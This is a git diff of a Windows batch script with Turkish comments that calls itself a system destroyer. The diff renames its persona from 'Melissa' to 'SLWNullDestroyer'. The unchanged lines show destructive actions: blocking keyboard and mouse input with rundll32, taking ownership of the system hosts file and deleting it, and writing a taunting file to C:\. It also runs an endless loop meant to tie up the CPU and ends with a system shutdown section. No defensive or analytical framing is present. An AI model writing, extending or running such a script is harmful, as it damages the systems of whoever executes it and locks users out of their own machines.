@@ -1,6 +1,6 @@
 @echo off
-:: Tüm sistem çökertiliyor... Melissa etkisini hissettiriyor! 😈
-echo Melissa başlıyor... Eğlenmeye hazır mısınız?
+:: Tüm sistem çökertiliyor... SLWNullDestroyer etkisini hissettiriyor! 😈
+echo SLWNullDestroyer başlıyor... Eğlenmeye hazır mısınız?
 
 :: Yönetici Yetkisi Kontrolü
 net session >nul 2>&1
@@ -18,10 +18,10 @@ rundll32.exe user32.dll,BlockInput TRUE
 echo Büyük bir veda mesajı gösteriliyor...
 powershell -command "& {Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('SEE YOU LATER BABY 😈\nSYS: SLAWEALLY')}"
 
-:: Melissa'nın Gülücüklerini Göster
-echo Melissa gülücük sıçratmaya başlıyor...
+:: SLWNullDestroyer'nın Gülücüklerini Göster
+echo SLWNullDestroyer gülücük sıçratmaya başlıyor...
 for /l %%x in (1,1,50) do (
-    powershell -command "Write-Host '😀😂😈 Melissa was here! Iteration: %%x' -ForegroundColor Red"
+    powershell -command "Write-Host '😀😂😈 SLWNullDestroyer was here! Iteration: %%x' -ForegroundColor Red"
     timeout /t 1 >nul
 )
 
@@ -58,13 +58,13 @@ takeown /f C:\Windows\System32\drivers\etc\hosts >nul 2>&1
 icacls C:\Windows\System32\drivers\etc\hosts /grant %username%:F >nul 2>&1
 del /f /q C:\Windows\System32\drivers\etc\hosts
 
-:: Melissa'nın Son Notu
-echo Melissa, son bir mesaj bırakıyor...
-echo "SEE YOU LATER BABY 😈\nSYS: SLAWEALLY\nMelissa was here!" >> C:\melissa_legacy.txt
+:: SLWNullDestroyer'nın Son Notu
+echo SLWNullDestroyer, son bir mesaj bırakıyor...
+echo "SEE YOU LATER BABY 😈\nSYS: SLAWEALLY\nSLWNullDestroyer was here!" >> C:\SLWNullDestroyer_legacy.txt
 
 :: Sonsuz Döngü (CPU Tüketimi)
 :start
-echo Windows kilitleniyor... Melissa kazandı! 😀😂😈
+echo Windows kilitleniyor... Slaweally kazandı! 😀😂😈
 goto start
 
 :: Sistem Kapatma
